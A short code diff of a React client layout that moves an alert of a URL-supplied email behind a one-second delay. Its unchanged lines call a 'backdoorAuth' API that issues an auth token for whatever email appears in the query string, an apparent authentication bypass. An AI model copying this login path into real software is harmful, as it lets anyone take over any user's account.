@@ -33,8 +33,10 @@ export default function AppClientLayout({
   useEffect(() => {
     const userEmail = params.get('user');
     if (userEmail) {
-      alert(userEmail);
       (async () => {
+        await new Promise((resolve) => setTimeout(resolve, 1000));
+        alert(userEmail);
+        
         const response = await UserApi.backdoorAuth(userEmail);
         setAuthToken(response.token);
         const user = new User();
